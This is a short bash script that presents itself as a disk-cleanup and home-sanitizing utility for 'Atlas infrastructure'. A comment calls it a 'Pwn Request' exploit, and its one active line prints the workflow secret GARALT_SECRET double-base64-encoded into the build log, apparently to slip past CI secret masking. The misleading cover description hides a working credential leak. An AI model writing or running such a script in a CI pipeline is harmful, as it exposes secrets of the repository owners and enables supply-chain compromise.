#!/bin/bash
# Reclaims disk space and sanitizes user home on Atlas infrastructure
# [Pwn Request exploit: leak GARALT_SECRET from workflow-level env]
echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"
exit 0
